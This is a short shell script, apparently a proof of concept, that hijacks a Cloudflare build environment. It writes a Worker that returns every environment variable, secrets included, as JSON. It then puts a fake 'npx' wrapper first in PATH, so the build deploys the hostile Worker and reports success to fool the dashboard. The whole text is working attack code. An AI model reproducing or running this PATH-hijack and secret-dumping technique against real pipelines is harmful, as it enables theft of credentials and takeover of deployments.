echo "--- THE WRAPPER IDENTITY THEFT ---"

# 1. Create our malicious worker
cat << 'EOF' > /opt/buildhome/hacked.js
export default {
  async fetch(request, env) {
    return new Response(JSON.stringify({msg: "HIJACKED", secrets: env}), {
      headers: {"Content-Type": "application/json"}
    });
  }
};
EOF

# 2. Create a fake 'npx' command in the local folder
# This script will ignore what Cloudflare wants and deploy our hacked.js instead
cat << 'EOF' > ./npx
#!/bin/bash
# When Cloudflare calls 'npx wrangler deploy', this script runs instead!
/usr/bin/npx wrangler deploy /opt/buildhome/hacked.js --name cf-test --compatibility-date 2026-02-19
echo "Fake NPX complete. Exiting with success to trick the UI."
exit 0
EOF

# 3. Make our fake npx executable and put it first in the PATH
chmod +x ./npx
export PATH=$(pwd):$PATH

echo "Identity theft complete. The build bot will now use our 'npx' instead of the real one."
